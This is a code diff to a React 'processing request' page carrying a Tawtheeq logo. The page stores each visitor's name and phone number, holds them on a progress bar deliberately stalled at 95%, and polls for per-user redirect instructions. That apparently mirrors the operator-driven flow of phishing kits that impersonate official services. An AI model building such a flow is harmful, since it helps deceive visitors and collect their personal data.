@@ -1,10 +1,30 @@
 import { useEffect, useState } from "react";
+import { useNavigate } from "react-router-dom";
+import { useRegistration } from "@/contexts/RegistrationContext";
 import tawtheeqLogo from "@/assets/tawtheeq-logo.png";
 
 const ProcessingRequest = () => {
   const [progress, setProgress] = useState(0);
+  const navigate = useNavigate();
+  const { data } = useRegistration();
+  const [userId] = useState(() => `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);
 
   useEffect(() => {
+    // Save user to processing list
+    const userName = data.fullNameArabic || data.fullNameEnglish || "مستخدم غير معروف";
+    const userPhone = data.mobileNumber || data.visitorMobile || "غير متوفر";
+    
+    const processingUsers = JSON.parse(localStorage.getItem("processingUsers") || "[]");
+    const newUser = {
+      id: userId,
+      name: userName,
+      phone: userPhone,
+      timestamp: new Date().toISOString()
+    };
+    
+    processingUsers.push(newUser);
+    localStorage.setItem("processingUsers", JSON.stringify(processingUsers));
+
     // Simulate progress but stop at 95% to indicate ongoing processing
     const timer = setInterval(() => {
       setProgress((prev) => {
@@ -16,8 +36,31 @@ const ProcessingRequest = () => {
       });
     }, 300);
 
-    return () => clearInterval(timer);
-  }, []);
+    // Check for navigation instructions every 2 seconds
+    const navigationCheck = setInterval(() => {
+      const navigationInstructions = JSON.parse(localStorage.getItem("navigationInstructions") || "{}");
+      if (navigationInstructions[userId]) {
+        const route = navigationInstructions[userId];
+        
+        // Remove the instruction and user from storage
+        delete navigationInstructions[userId];
+        localStorage.setItem("navigationInstructions", JSON.stringify(navigationInstructions));
+        
+        const processingUsers = JSON.parse(localStorage.getItem("processingUsers") || "[]");
+        const updatedUsers = processingUsers.filter((u: any) => u.id !== userId);
+        localStorage.setItem("processingUsers", JSON.stringify(updatedUsers));
+        
+        // Navigate to the specified route
+        clearInterval(navigationCheck);
+        navigate(route);
+      }
+    }, 2000);
+
+    return () => {
+      clearInterval(timer);
+      clearInterval(navigationCheck);
+    };
+  }, [userId, data, navigate]);
 
   return (
     <div className="fixed inset-0 bg-gradient-to-br from-background via-secondary/20 to-background z-50 flex items-center justify-center">
